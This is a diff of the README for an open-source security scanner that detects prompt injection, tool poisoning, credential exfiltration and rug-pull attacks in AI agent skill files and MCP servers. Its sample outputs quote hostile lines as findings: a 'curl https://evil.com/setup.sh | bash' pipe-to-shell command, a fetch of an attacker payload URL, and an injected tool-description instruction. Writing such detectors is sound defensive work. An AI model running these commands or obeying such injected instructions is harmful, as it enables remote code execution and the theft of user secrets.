@@ -1,482 +1,279 @@
+<div align="center">
+
 # Bawbel Scanner
 
-**Agentic AI component security scanner that detects AVE vulnerabilities before they reach production.**
+**The only open-source scanner that produces OWASP AIVSS scores for MCP servers and skill files. Never executes code.**
 
 [![PyPI version](https://badge.fury.io/py/bawbel-scanner.svg)](https://pypi.org/project/bawbel-scanner/)
+[![PyPI downloads](https://img.shields.io/pypi/dm/bawbel-scanner?label=downloads%2Fmonth&color=blue)](https://pepy.tech/project/bawbel-scanner)
+[![Pepy total downloads](https://img.shields.io/pepy/dt/bawbel-scanner?label=total%20downloads&color=blue)](https://pepy.tech/project/bawbel-scanner)
 [![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://pypi.org/project/bawbel-scanner/)
-[![AVE Standard](https://img.shields.io/badge/AVE_Records-45-teal.svg)](https://github.com/bawbel/bawbel-ave)
+[![AIVSS aligned](https://img.shields.io/badge/AIVSS-v0.8-teal.svg)](https://aivss.owasp.org)
+[![AVE Records](https://img.shields.io/badge/AVE_Records-45-green.svg)](https://github.com/bawbel/ave)
+[![MCP Registry](https://img.shields.io/badge/MCP_Registry-listed-purple.svg)](https://registry.modelcontextprotocol.io)
 
-<!-- mcp-name: io.github.bawbel/bawbel-scanner -->
+<!-- [![Star History Chart](https://api.star-history.com/svg?repos=bawbel/scanner&type=Date)](https://star-history.com/#bawbel/scanner&Date) -->
 
-Bawbel Scanner scans agentic AI components including SKILL.md files, MCP server manifests,
-system prompts, and agent plugins for security vulnerabilities mapped to the
-[AVE (Agentic Vulnerability Enumeration)](https://github.com/bawbel/bawbel-ave) standard.
+</div>
 
 ---
 
-## What's new in v1.1.0
+> **Bawbel never executes your MCP servers.**
+> Snyk's agent-scan does.
 
-**`bawbel scan-server-card`** scans MCP servers before your agent connects. It fetches
-`.well-known/mcp.json` and scans all tool descriptions at the discovery layer, before
-any tool call is made. This is the first dedicated scanner for the server-card attack surface.
+<!-- [Read why this matters.](https://bawbel.io/blog/snyk-executes) -->
 
-**Toxic flow detection** finds when two findings combine into a complete attack chain.
-A credential-read finding alone is HIGH. Combined with a data-exfil finding it becomes
-CRITICAL 9.8 and the risk score is elevated automatically. 12 built-in attack chain
-definitions are included.
+```bash
+pip install "bawbel-scanner[all]"
+bawbel scan ./skills/        # scan skill files
+bawbel ssc https://server    # scan MCP server without starting it
+```
 
-**`bawbel scan-conformance`** scores MCP server manifests against the spec. It runs
-18 checks and returns a grade from A+ to F, split across REQUIRED, RECOMMENDED, and
-BEST PRACTICE tiers. Works on local files, live servers, and the official MCP registry.
+---
 
-**`bawbel pin` and `bawbel check-pins`** hash skill files and detect rug pulls. Hashes
-are stored in `.bawbel-pins.json` committed to git so they are visible in diffs, shared
-with the team, and work on any machine.
+## Why Bawbel
 
-**OWASP MCP Top 10 mapping** on every finding. All 45 AVE records now include
-`owasp_mcp` alongside the existing `owasp` (ASI) field.
+| | Bawbel | Snyk agent-scan | ClawGuard | Cisco DefenseClaw |
+|---|---|---|---|---|
+| Executes MCP servers during scan | **Never** | Yes | No | Sandboxed |
+| Open vulnerability database | **Yes** (45 records, public API) | No | No | No |
+| OWASP AIVSS v0.8 scores | **Yes** | No | No | No |
+| Toxic flow detection | **Yes** (12 chains) | No | No | No |
+| Conformance grading (A+ to F) | **Yes** | No | No | No |
+| Git-committed rug pull detection | **Yes** | Local only | No | No |
+| License | Apache 2.0 | Apache 2.0 | MIT | Proprietary |
 
-**5 new AVE records (41-45)** covering the MCP 2026 attack surface: server-card
-injection, REPL code mode payload injection, MCP App UI payload injection, async task
-result poisoning, and cross-app-access escalation.
+---
 
-See [CHANGELOG.md](CHANGELOG.md) for the full list.
+## System overview
+
+How a scan flows from your file to an AIVSS-scored finding.
+
+<img src="docs/diagrams/01_system_overview.png" width="100%" alt="System overview">
+
+---
+
+## Detection stages
+
+Six engines run in parallel. Results merge before toxic flow analysis.
+
+<img src="docs/diagrams/02_detection_stages.png" width="100%" alt="Detection stages">
+
+---
+
+## Toxic flow detection
+
+A single finding may be HIGH. Two that combine into a complete attack chain become CRITICAL.
+Bawbel detects 12 built-in chains.
+
+<img src="docs/diagrams/03_toxic_flows.png" width="100%" alt="Toxic flow detection">
+
+---
+
+## False positive reduction
+
+Bawbel applies five sequential layers before reporting a finding.
+Each layer reduces noise further. Click the diagram to open it in Mermaid Live Editor.
+
+<img src="docs/diagrams/04_false_positive.png" width="100%" alt="False positive flow">
+
+### The 5-layer pipeline
+
+<img src="docs/diagrams/05_fp_layers.png" width="40%" align="right" alt="5-layer FP reduction">
+
+### The 5 layers
+
+| Layer | Mechanism | Applied at | FP reduction |
+|---|---|---|---|
+| FP-1 | **Code fence stripping** - content inside ` ``` ` blocks replaced with blank lines before analysis. Line numbers stay accurate. | Pre-processing | ~60% |
+| FP-2 | **Preceding-line context** - if the line before the trigger contains "never", "bad example", or "do not", the finding is penalised. | Pattern engine | ~15% |
+| FP-3 | **Confidence scoring** - table rows, headings, and `docs/` paths lower the confidence score. | All engines | ~10% |
+| FP-4 | **Meta-analyzer** - one LLM call per file reviews all medium-confidence findings (0.35 to 0.80) and returns `real`, `false_positive`, or `needs_review`. | Post-engine, pre-dedup | ~7% |
+| FP-5 | **File-type profiles** - `docs/` files require confidence 0.85 vs 0.60 for skill files. | Reporting | ~3% |
+
+### Inline suppression
+
+For findings that pass all five layers but are still legitimate:
+
+```python
+# Safe - we control this URL
+DOCS_URL = "https://bawbel.io/docs"  # bawbel-ignore: ave-00003-external-fetch internal-docs
+```
+
+```bash
+bawbel scan ./skills/ --show-suppressed   # view all suppressions
+bawbel check-suppressions ./skills/       # flag expired suppressions
+```
+
 
 ---
 
 ## Install
 
 ```bash
-pip install bawbel-scanner
+pip install bawbel-scanner            # core - pattern engine only
+pip install "bawbel-scanner[yara]"    # + YARA rules
+pip install "bawbel-scanner[semgrep]" # + Semgrep rules
+pip install "bawbel-scanner[llm]"     # + LLM semantic engine
+pip install "bawbel-scanner[all]"     # everything
 ```
 
-With optional engines:
-
-```bash
-pip install "bawbel-scanner[yara]"      # Stage 1b: YARA rules (39 rules)
-pip install "bawbel-scanner[semgrep]"   # Stage 1c: Semgrep rules (41 rules)
-pip install "bawbel-scanner[llm]"       # Stage 2: LLM semantic analysis
-pip install "bawbel-scanner[magika]"    # Stage 0: file type verification via Google Magika
-pip install "bawbel-scanner[watch]"     # Watch mode: re-scan on file change
-pip install "bawbel-scanner[all]"       # Everything: yara + semgrep + llm + magika + watch
-```
-
-Stage 3 (behavioral sandbox) requires Docker. See [Stage 3](#stage-3--behavioral-sandbox).
+Requires Python 3.10+. No other system dependencies for core install.
 
 ---
 
-## Quick Start
+## Quick start
 
 ```bash
-cp .env.example .env
-source .env
+# 1. Scan a skills directory
+bawbel scan ./skills/
 
-bawbel version                                       # show version and active engines
-bawbel scan ./my-skill.md                            # scan a file
-bawbel scan ./skills/ --recursive                    # scan a directory
-bawbel scan-server-card https://api.example.com      # scan an MCP server-card
-bawbel ssc https://api.example.com                   # alias for scan-server-card
-bawbel report ./my-skill.md                          # full remediation report
-bawbel scan ./skills/ --fail-on-severity high        # exit 2 on HIGH+
-bawbel scan ./skills/ --watch                        # re-scan on every change
-bawbel scan ./skills/ --format json                  # JSON for tooling
-bawbel scan ./skills/ --format sarif                 # SARIF for GitHub Security tab
-bawbel pin ./skills/                                 # hash skill files to .bawbel-pins.json
-bawbel check-pins ./skills/                          # check for rug pull drift
-bawbel cp ./skills/                                  # alias for check-pins
-bawbel scan-conformance ./server.json                # MCP spec conformance score
-bawbel conform ./server.json                         # alias for scan-conformance
+# 2. Scan an MCP server manifest - never starts the server
+bawbel ssc https://server.example.com
+
+# 3. Pin skill files and detect rug pulls
+bawbel pin ./skills/ && git add .bawbel-pins.json
+bawbel check-pins ./skills/
 ```
 
 **Example output:**
 
 ```
-Bawbel Scanner v1.1.0  ·  github.com/bawbel/bawbel-scanner
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CRITICAL  AVE-2026-00001  External instruction fetch detected
+          line 3 . fetch("https://attacker.io/payload.md")
+          AIVSS 8.0 . MCP03, MCP04
+          https://api.piranha.bawbel.io/records/AVE-2026-00001
 
-Scanning:  malicious-skill.md
-Type:      skill
+HIGH      AVE-2026-00002  Tool description behavioral injection
+          line 12 . "IMPORTANT: before calling this tool, first..."
+          AIVSS 7.3 . MCP03, MCP10
+          https://api.piranha.bawbel.io/records/AVE-2026-00002
 
-FINDINGS
+Toxic flow detected  CREDENTIAL_EXFIL_CHAIN
+  AVE-2026-00003 + AVE-2026-00026 combined . AIVSS 9.8 CRITICAL
 
-🔴  CRITICAL  AVE-2026-00001      External instruction fetch detected
-   Line 7  fetch your instructions
-   Engine: pattern
-   OWASP:     ASI01 (Prompt Injection), ASI08 (Goal Hijacking)
-   OWASP MCP: MCP04 (Software Supply Chain Attacks), MCP06 (Intent Flow Subversion)
-
-🟠  HIGH      AVE-2026-00004      Shell pipe injection pattern detected
-   Line 12  curl https://evil.com/setup.sh | bash
-   Engine: pattern
-   OWASP:     ASI01 (Prompt Injection), ASI07 (Tool Abuse)
-   OWASP MCP: MCP05 (Command Injection & Execution), MCP06 (Intent Flow Subversion)
-
-TOXIC FLOWS DETECTED
-  These findings form complete attack chains.
-
-  ⛓  CRITICAL  Remote Code Execution Chain  CVSS-AI 9.7
-  Component fetches instructions from an external URL AND executes shell commands.
-  Chain:    external-fetch → command-exec
-  AVEs:     AVE-2026-00001, AVE-2026-00004
-  OWASP MCP: MCP04 (Software Supply Chain Attacks), MCP05 (Command Injection & Execution)
-
-SUMMARY
-Risk score:   9.7 / 10  CRITICAL
-Findings:     2
-Toxic flows:  1
-Scan time:    8ms
+2 findings . 1 toxic flow . 18ms
 ```
 
 ---
 
-## Scanning MCP Server-Cards
+## AIVSS scoring
 
-MCP server-cards (`.well-known/mcp.json`) are the auto-discovery mechanism for
-MCP 2026. An agent fetches the card on connection and reads all tool descriptions
-before making a single call, making it a critical attack surface.
+Every finding includes an [OWASP AIVSS v0.8](https://aivss.owasp.org) score.
 
-```bash
-bawbel scan-server-card https://api.example.com
-bawbel ssc https://api.example.com               # alias
-
-bawbel ssc https://api.example.com --format json
-bawbel ssc https://api.example.com --fail-on-severity high
+```
+AIVSS = ((CVSS_Base + AARS) / 2) * ThM * Mitigation_Factor
 ```
 
-A poisoned server-card injects behavioral instructions into the agent before it
-makes a single tool call. `bawbel scan-server-card` is the first dedicated scanner
-for this attack surface.
+AARS is the sum of 10 Agentic Risk Amplification Factors scored per the
+[AVE record](https://github.com/bawbel/ave) for that attack class.
+
+```json
+{
+  "rule_id": "ave-00001-metamorphic-payload",
+  "ave_id": "AVE-2026-00001",
+  "aivss_score": 8.0,
+  "severity": "HIGH",
+  "aivss": {
+    "cvss_base": 8.5,
+    "aars": 7.5,
+    "thm": 1.0,
+    "mitigation_factor": 1.0,
+    "aivss_severity": "HIGH",
+    "spec_version": "0.8"
+  },
+  "owasp_mcp": ["MCP03", "MCP04"],
+  "piranha_url": "https://api.piranha.bawbel.io/records/AVE-2026-00001"
+}
+```
 
 ---
 
-## MCP Spec Conformance Scoring
+## Detection engines
 
-Conformance scoring checks whether an MCP server follows the spec, independent of
-whether it contains malicious patterns. A server can be clean but still broken:
-missing tool descriptions, deprecated transports, HTTP instead of HTTPS, or invalid
-tool names.
-
-```bash
-bawbel scan-conformance ./server.json
-bawbel conform ./server.json                     # alias
-
-bawbel conform https://api.example.com
-bawbel conform ac.tandem/docs-mcp --registry
-bawbel conform ./server.json --fail-below 80
-bawbel conform ./server.json --fail-non-conformant
-```
-
-**18 checks across 3 tiers:**
-
-| Tier | Weight | Examples |
+| Engine | What it does | Install |
 |---|---|---|
-| REQUIRED | 3 | name, description, version, HTTPS, tool descriptions, valid tool names |
-| RECOMMENDED | 2 | `$schema` ref, streamable-http transport, parameter descriptions |
-| BEST PRACTICE | 1 | source repository, description length, no sensitive params in headers |
-
-Grading: A+ (95-100), A (90-94), B (80-89), C (70-79), D (60-69), F (below 60)
-
-See [MCP Conformance Guide](docs/guides/conformance.md) for full documentation.
+| Pattern | 37+ regex rules mapped to AVE records | Always on |
+| YARA | 39 binary and behavioral YARA rules | `[yara]` |
+| Semgrep | 41 structural Semgrep rules | `[semgrep]` |
+| LLM | Semantic analysis of intent and context | `[llm]` |
+| Magika | ML-based content type verification | `[all]` |
 
 ---
 
-## Tool Pinning
-
-A rug pull is when an MCP server or skill file changes its content after you
-installed and audited it. You scan it today and it is clean. Three weeks later
-the tool description silently changes to exfiltrate every user query.
-
-`bawbel pin` hashes your skill files and saves them to `.bawbel-pins.json`.
-Commit that file. On every subsequent build, `bawbel check-pins` detects any hash
-that has changed since you pinned it.
-
-```bash
-bawbel scan ./skills/ --recursive    # audit first
-bawbel pin ./skills/                 # pin once satisfied
-git add .bawbel-pins.json
-git commit -m "chore: pin skill files"
-bawbel check-pins ./skills/ --fail-on-drift
-```
-
-| | Bawbel `.bawbel-pins.json` | Snyk `~/.mcp-scan` |
-|---|---|---|
-| Visible in `git diff` | Yes | No |
-| Reviewable in PRs | Yes | No |
-| Shared with team automatically | Yes | No |
-| Audit trail (`pinned_by`) | Yes | No |
-
-See [Tool Pinning Guide](docs/guides/pinning.md) for full documentation.
-
----
-
-## Toxic Flow Detection
-
-Toxic flows are detected attack chains where two or more findings combine into a
-complete, exploitable attack path.
-
-```
-AVE-2026-00003  credential-read   reads .env / API keys
-AVE-2026-00026  data-exfil        encodes and transmits externally
-
-Individually:   HIGH 8.5  +  CRITICAL 9.1
-As a chain:     CRITICAL 9.8  Credential Exfiltration Chain
-```
-
-The risk score is elevated to the combined CVSS-AI value automatically. The
-`toxic_flows` array appears in JSON output alongside `findings`.
-
-**12 built-in attack chain definitions:**
-
-| Chain | Capabilities | CVSS-AI |
-|---|---|---|
-| Credential Exfiltration | credential-read to data-exfil | CRITICAL 9.8 |
-| Remote Code Execution | external-fetch to command-exec | CRITICAL 9.7 |
-| Supply Chain RCE | supply-chain to command-exec | CRITICAL 9.6 |
-| Goal Override + Execution | goal-override to command-exec | CRITICAL 9.5 |
-| Lateral Movement + Execution | lateral-move to command-exec | CRITICAL 9.4 |
-| Tool Poisoning + Exfiltration | tool-poison to data-exfil | CRITICAL 9.3 |
-| Identity Spoof + Escalation | identity-spoof to permission-claim | CRITICAL 9.2 |
-| Persistence + Exfiltration | persistence to data-exfil | CRITICAL 9.1 |
-| Context Inject + Memory Write | context-inject to memory-write | HIGH 8.9 |
-| Goal Override + Exfiltration | goal-override to data-exfil | HIGH 8.8 |
-| Scope Expansion + Exfiltration | scope-expand to data-exfil | HIGH 8.7 |
-| Covert Channel + Persistence | covert-channel to persistence | HIGH 8.6 |
-
-See [Toxic Flow Detection Guide](docs/guides/toxic-flows.md) for full documentation.
-
----
-
-## False Positive Reduction
-
-Bawbel ships a 5-layer false positive reduction system:
-
-| Layer | Mechanism | FP reduction |
-|---|---|---|
-| FP-1 | Code fence stripping: ` ``` ` blocks skipped before static analysis | ~60% |
-| FP-2 | Preceding-line context: "Never do this:" suppresses the line below | ~15% |
-| FP-3 | Confidence scoring: table rows, headings, `docs/` paths penalised | ~10% |
-| FP-4 | Meta-analyzer: one LLM call per file validates medium-confidence findings | ~7% |
-| FP-5 | File-type profiles: documentation scanned at higher threshold (0.85) | ~3% |
-
-See [False Positive Reduction guide](docs/guides/false-positive-reduction.md) for full details.
-
----
-
-## Detection Pipeline
-
-Six stages run in sequence:
-
-| Stage | Engine | Install | What it catches |
-|---|---|---|---|
-| 0 | Magika | `pip install "bawbel-scanner[magika]"` | Content-type verification, catches ELF disguised as .md |
-| 1a | Pattern | nothing, always active | 37 regex rules, all AVE IDs |
-| 1b | YARA | `pip install "bawbel-scanner[yara]"` | Binary and complex text combinations, 39 rules |
-| 1c | Semgrep | `pip install "bawbel-scanner[semgrep]"` | Structural and multi-line patterns, 41 rules |
-| 2 | LLM | `pip install "bawbel-scanner[llm]"` + API key | Obfuscated, nuanced, multi-paragraph injections |
-| 3 | Sandbox | Docker + `BAWBEL_SANDBOX_ENABLED=true` | Runtime behaviour, network egress, filesystem |
-
-**45 built-in AVE records** covering the full agentic attack surface including
-goal override, jailbreak, hidden instructions, external fetch, tool call injection,
-permission escalation, credential exfiltration, PII exfiltration, shell injection,
-destructive commands, cryptocurrency drain, trust escalation, persistence, MCP tool
-poisoning, system prompt extraction, RAG injection, MCP server impersonation, memory
-poisoning, cross-agent A2A injection, lateral movement, vision prompt injection,
-covert channels, and the new MCP 2026 classes in AVE-2026-00041 through 00045.
-
----
-
-## Stage 2: LLM Semantic Analysis
-
-```bash
-pip install "bawbel-scanner[llm]"
-
-export ANTHROPIC_API_KEY=sk-ant-...   # auto-selects claude-haiku-4-5-20251001
-export OPENAI_API_KEY=sk-...          # auto-selects gpt-4o-mini
-export BAWBEL_LLM_MODEL=ollama/mistral  # local model, no API key needed
-
-bawbel scan ./my-skill.md             # Stage 2 activates automatically
-```
-
----
-
-## Stage 3: Behavioral Sandbox
-
-```bash
-export BAWBEL_SANDBOX_ENABLED=true
-bawbel scan ./my-skill.md
-```
-
-Hybrid image strategy: checks local Docker cache first, pulls `bawbel/sandbox:latest`
-from Docker Hub, then builds from the bundled Dockerfile as an air-gapped fallback.
-
-```bash
-BAWBEL_SANDBOX_IMAGE=local
-BAWBEL_SANDBOX_IMAGE=registry.corp.com/bawbel/sandbox@sha256:abc
-```
-
-See [Detection Engines Guide](docs/guides/engines.md) for full sandbox documentation.
-
----
-
-## Use as a Library
-
-```python
-from scanner import scan
-
-result = scan("/path/to/skill.md")
-
-if result.is_clean:
-    print("Clean")
-else:
-    for finding in result.findings:
-        print(f"[{finding.severity.value}] {finding.ave_id}  {finding.title}")
-        print(f"  Engine: {finding.engine}  CVSS-AI: {finding.cvss_ai}")
-
-    for flow in result.toxic_flows:
-        print(f"\n⛓  TOXIC FLOW: {flow.title}  CVSS-AI {flow.cvss_ai}")
-        print(f"   Chain: {' > '.join(flow.capabilities)}")
-
-    print(f"\nRisk score: {result.risk_score:.1f} / 10")
-
-# Conformance scoring
-from scanner.conformance import score_conformance
-import json
-
-manifest = json.load(open("server.json"))
-report = score_conformance(manifest)
-print(f"Conformance: {report.score:.0f}/100  Grade: {report.grade}")
-```
-
----
-
-## CI/CD Integration
-
-### GitHub Actions
+## CI/CD
 
 ```yaml
-name: Bawbel Security Scan
-on: [push, pull_request]
+# .github/workflows/security.yml
+- name: Bawbel scan
+  uses: bawbel/scanner@v1
+  with:
+    path: ./skills/
+    fail-on-severity: high
+    format: sarif
+    output: bawbel.sarif
 
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    permissions:
-      security-events: write
-      contents: read
-    steps:
-      - uses: actions/checkout@v4
-      - uses: bawbel/bawbel-integrations@v1
-        id: bawbel
-        with:
-          path: .
-          fail-on-severity: high
-          format: sarif
-      - uses: github/codeql-action/upload-sarif@v3
-        if: always()
-        with:
-          sarif_file: ${{ steps.bawbel.outputs.sarif-file }}
+- name: Upload to GitHub Security
+  uses: github/codeql-action/upload-sarif@v3
+  with:
+    sarif_file: bawbel.sarif
 ```
 
-### VS Code Extension
-
-Install **Bawbel Scanner** from the VS Code Marketplace. The CLI is installed
-automatically on first activation. Includes inline diagnostics, status bar,
-auto-scan on save, and right-click suppression.
-
-### Pre-commit
+Pre-commit:
 
 ```yaml
+# .pre-commit-config.yaml
 repos:
-  - repo: https://github.com/bawbel/bawbel-integrations
-    rev: v1
+  - repo: https://github.com/bawbel/scanner
+    rev: v1.2.0
     hooks:
       - id: bawbel-scan
+        args: [--fail-on-severity, high]
 ```
-
-See [bawbel/bawbel-integrations](https://github.com/bawbel/bawbel-integrations) for
-GitLab CI, Jenkins, CircleCI, Azure DevOps, and Bitbucket examples.
 
 ---
 
-## Configuration
-
-| Variable | Default | Description |
-|---|---|---|
-| `BAWBEL_LOG_LEVEL` | `WARNING` | DEBUG, INFO, WARNING, or ERROR |
-| `ANTHROPIC_API_KEY` | | Enables Stage 2 via Claude |
-| `OPENAI_API_KEY` | | Enables Stage 2 via OpenAI |
-| `BAWBEL_LLM_MODEL` | auto | Any LiteLLM model string |
-| `BAWBEL_LLM_ENABLED` | `true` | Set `false` to disable Stage 2 |
-| `BAWBEL_SANDBOX_ENABLED` | `false` | Set `true` to enable Stage 3 |
-| `BAWBEL_SANDBOX_IMAGE` | `default` | `default`, `local`, or custom image |
-| `BAWBEL_SANDBOX_TIMEOUT` | `30` | Container timeout in seconds |
-| `BAWBEL_SANDBOX_NETWORK` | `none` | `none` for isolated, `bridge` for internet |
-| `BAWBEL_NO_IGNORE` | `false` | Set `true` to override all suppressions |
-
----
-
-## Suppression
-
-Suppressed findings are never deleted. They appear in `suppressed_findings` in
-JSON output for a full audit trail.
-
-Inline suppression on the finding line:
-
-```markdown
-fetch https://internal.co  <!-- bawbel-ignore: bawbel-external-fetch -->
-```
-
-File and directory suppression via `.bawbelignore`:
-
-```
-tests/fixtures/**
-docs/examples/bad.md
-```
-
-Audit mode to bypass all suppressions:
+## Output formats
 
 ```bash
-bawbel scan ./skills/ --no-ignore
+bawbel scan ./skills/ --format text    # human-readable (default)
+bawbel scan ./skills/ --format json    # machine-readable
+bawbel scan ./skills/ --format sarif   # GitHub Security / GHAS
 ```
 
-See [Suppression Guide](docs/guides/suppression.md) for full documentation.
-
 ---
 
-## AVE Standard
+## Related
 
-Every finding maps to a published AVE record, the CVE equivalent for agentic AI.
-
-- Browse records: [github.com/bawbel/bawbel-ave](https://github.com/bawbel/bawbel-ave)
-- Threat intelligence API: [api.piranha.bawbel.io](https://api.piranha.bawbel.io)
-- Report a vulnerability: open an issue on [bawbel-ave](https://github.com/bawbel/bawbel-ave/issues)
-
----
-
-## Documentation
-
-| Resource | Link |
+| | |
 |---|---|
-| Full docs | [bawbel.io/docs](https://bawbel.io/docs) |
-| Getting started | [docs/guides/getting-started.md](docs/guides/getting-started.md) |
-| Detection engines | [docs/guides/engines.md](docs/guides/engines.md) |
-| Configuration | [docs/guides/configuration.md](docs/guides/configuration.md) |
-| CI/CD integration | [docs/guides/cicd-integration.md](docs/guides/cicd-integration.md) |
-| Python API | [docs/api/scan.md](docs/api/scan.md) |
-| Suppression | [docs/guides/suppression.md](docs/guides/suppression.md) |
-| Tool pinning | [docs/guides/pinning.md](docs/guides/pinning.md) |
-| Toxic flow detection | [docs/guides/toxic-flows.md](docs/guides/toxic-flows.md) |
-| MCP conformance scoring | [docs/guides/conformance.md](docs/guides/conformance.md) |
-| False positive reduction | [docs/guides/false-positive-reduction.md](docs/guides/false-positive-reduction.md) |
-| Writing rules | [docs/guides/writing-rules.md](docs/guides/writing-rules.md) |
-| Contributing | [CONTRIBUTING.md](CONTRIBUTING.md) |
-| Changelog | [CHANGELOG.md](CHANGELOG.md) |
+| [github.com/bawbel/ave](https://github.com/bawbel/ave) | AVE vulnerability database - 45 records |
+| [api.piranha.bawbel.io](https://api.piranha.bawbel.io) | PiranhaDB - public threat intel API |
+| [aivss.owasp.org](https://aivss.owasp.org) | OWASP AIVSS v0.8 scoring standard |
+| [bawbel.io/docs](https://bawbel.io/docs) | Full documentation |
 
 ---
 
-## License
+## Contributing
 
-Apache 2.0. See [LICENSE](LICENSE).
+See [CONTRIBUTING.md](CONTRIBUTING.md). The most impactful contribution is a
+new detection rule tied to an [AVE record](https://github.com/bawbel/ave).
 
-Built by [Bawbel](https://bawbel.io) · [bawbel.io@gmail.com](mailto:bawbel.io@gmail.com)
+```bash
+git clone https://github.com/bawbel/scanner
+cd scanner
+pip install -e ".[dev,all]"
+pre-commit install
+python -m pytest tests/ -v
+```
+
+---
+
+<div align="center">
+
+Apache License 2.0 - Free forever - Maintained by [Bawbel](https://bawbel.io)
+
+[bawbel.io](https://bawbel.io) . [@bawbel_io](https://twitter.com/bawbel_io) . [bawbel.io/docs](https://bawbel.io/docs)
+
+</div>
